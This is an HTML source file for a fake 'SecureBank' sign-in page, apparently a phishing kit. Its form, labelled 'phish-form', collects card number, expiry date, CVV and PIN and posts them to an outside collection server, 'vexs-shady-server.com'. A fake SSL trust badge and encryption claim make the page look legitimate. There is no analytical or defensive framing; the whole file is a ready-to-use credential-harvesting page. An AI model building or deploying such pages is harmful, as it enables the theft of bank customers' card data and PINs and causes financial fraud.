<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SecureBank - Login</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="container">
        <header>
            <img src="securebank_logo.png" alt="SecureBank Logo" class="logo">
            <h1>Welcome to SecureBank Online</h1>
        </header>
        <main>
            <div class="login-box">
                <h2>Sign In to Your Account</h2>
                <form id="phish-form" action="http://vexs-shady-server.com/collect" method="POST">
                    <label for="card-number">Card Number</label>
                    <input type="text" id="card-number" name="card-number" placeholder="1234 5678 9012 3456" required>
                    <label for="exp-date">Expiration Date</label>
                    <input type="text" id="exp-date" name="exp-date" placeholder="MM/YY" required>
                    <label for="cvv">CVV</label>
                    <input type="text" id="cvv" name="cvv" placeholder="123" required>
                    <label for="pin">PIN</label>
                    <input type="password" id="pin" name="pin" placeholder="Enter your PIN" required>
                    <button type="submit">Sign In</button>
                </form>
            </div>
        </main>
        <footer>
            <img src="trust_badge.png" alt="Secure SSL" class="badge">
            <p>Protected by SecureBank Encryption</p>
        </footer>
    </div>
    <script src="script.js"></script>
</body>
</html>
